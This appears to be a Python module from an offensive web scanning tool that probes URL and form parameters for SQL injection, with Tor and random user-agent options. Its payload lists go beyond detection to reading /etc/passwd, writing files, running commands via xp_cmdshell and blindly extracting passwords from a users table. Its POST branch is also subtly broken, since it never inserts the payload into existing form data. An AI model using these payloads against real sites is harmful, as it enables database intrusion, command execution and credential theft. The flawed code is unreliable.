#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection Scanner Module
"""

import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from utils.requester import Requester
from utils.colors import Colors

class SQLiScanner:
    def __init__(self, url, data=None, cookies=None, headers=None, 
                 proxy=None, timeout=10, level=1, risk=1, 
                 random_agent=False, tor=False):
        self.url = url
        self.data = data
        self.cookies = cookies
        self.headers = headers
        self.proxy = proxy
        self.timeout = timeout
        self.level = level
        self.risk = risk
        self.random_agent = random_agent
        self.tor = tor
        
        self.requester = Requester(
            proxy=proxy,
            timeout=timeout,
            random_agent=random_agent,
            tor=tor
        )
        
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*?MySQL",
                r"Warning.*?mysql_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
            ],
            'mssql': [
                r"Driver.*? SQL[\-\_ ]*Server",
                r"OLE DB.*? SQL Server",
                r"(\W|\A)SQL.*?(Server|Exception)",
                r"Warning.*?mssql_",
                r"Unclosed quotation mark",
                r"Microsoft SQL.*?Error",
            ],
            'postgres': [
                r"PostgreSQL.*?ERROR",
                r"Warning.*?pg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError",
                r"org\.postgresql",
            ],
            'oracle': [
                r"Driver.*?Oracle",
                r"ORA-[0-9]{4,5}",
                r"Oracle error",
                r"Oracle.*?Driver",
                r"Warning.*?oci_",
                r"quoted string not properly terminated",
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite",
                r"Warning.*?sqlite_",
                r"not a valid SQLite result",
            ]
        }
        
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        payloads = []
        
        # Basic payloads
        basic = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1 OR 1=1",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1 AND pg_sleep(5)--",
        ]
        
        # Level-based payloads
        if self.level >= 2:
            level2 = [
                "1' AND 1=1 UNION SELECT NULL--",
                "' OR 'x'='x",
                "') OR ('1'='1",
                "')) OR (('1'='1",
                "' OR 1=1 LIMIT 1--",
                "1' AND 1=1 ORDER BY 1--",
                "1' AND 1=1 ORDER BY 1000--",
            ]
            basic.extend(level2)
        
        if self.level >= 3:
            level3 = [
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",
                "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)--",
                "1' INTO OUTFILE '/tmp/test.txt'--",
                "1' AND LOAD_FILE('/etc/passwd')--",
            ]
            basic.extend(level3)
        
        if self.level >= 4:
            level4 = [
                "1'; EXEC xp_cmdshell 'dir'--",
                "1'; EXEC master..xp_cmdshell 'dir'--",
                "1' UNION ALL SELECT @@version, NULL, NULL--",
                "1' AND 1=CONVERT(int, (SELECT @@version))--",
            ]
            basic.extend(level4)
        
        if self.level >= 5:
            level5 = [
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "1' AND (SELECT LENGTH(password) FROM users LIMIT 1)>0--",
                "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>0--",
            ]
            basic.extend(level5)
        
        return basic
    
    def _test_parameter(self, param, value, is_post=False):
        vulns = []
        
        for payload in self.payloads:
            test_value = value + payload if not is_post else value + payload
            
            if is_post:
                test_data = self.data.replace(f"{param}=", f"{param}=") if self.data else f"{param}={test_value}"
                response = self.requester.post(self.url, data=test_data, headers=self.headers, cookies=self.cookies)
            else:
                parsed = urllib.parse.urlparse(self.url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [test_value]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                response = self.requester.get(test_url, headers=self.headers, cookies=self.cookies)
            
            if response:
                # Check for error-based detection
                dbms = self._detect_dbms(response.text)
                if dbms:
                    vulns.append({
                        'parameter': param,
                        'payload': payload,
                        'type': 'error-based',
                        'dbms': dbms,
                        'url': test_url if not is_post else self.url,
                        'method': 'POST' if is_post else 'GET'
                    })
                    continue
                
                # Check for time-based detection
                if response.elapsed.total_seconds() > 4:
                    vulns.append({
                        'parameter': param,
                        'payload': payload,
                        'type': 'time-based',
                        'dbms': 'unknown',
                        'url': test_url if not is_post else self.url,
                        'method': 'POST' if is_post else 'GET'
                    })
        
        return vulns
    
    def _detect_dbms(self, response_text):
        for dbms, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return dbms
        return None
    
    def _get_parameters(self):
        params = []
        
        # GET parameters
        parsed = urllib.parse.urlparse(self.url)
        qs = urllib.parse.parse_qs(parsed.query)
        for param in qs:
            params.append((param, qs[param][0], False))
        
        # POST parameters
        if self.data:
            post_params = urllib.parse.parse_qs(self.data)
            for param in post_params:
                params.append((param, post_params[param][0], True))
        
        return params
    
    def scan(self):
        print(f"{Colors.YELLOW}[*] Starting SQLi scan on {self.url}{Colors.END}")
        
        params = self._get_parameters()
        if not params:
            print(f"{Colors.RED}[!] No parameters found to test{Colors.END}")
            return []
        
        print(f"{Colors.CYAN}[*] Found {len(params)} parameter(s) to test{Colors.END}")
        
        all_vulns = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for param, value, is_post in params:
                futures.append(executor.submit(self._test_parameter, param, value, is_post))
            
            for future in futures:
                result = future.result()
                all_vulns.extend(result)
        
        # Remove duplicates
        unique_vulns = []
        seen = set()
        for v in all_vulns:
            key = (v['parameter'], v['payload'])
            if key not in seen:
                seen.add(key)
                unique_vulns.append(v)
        
        return unique_vulns
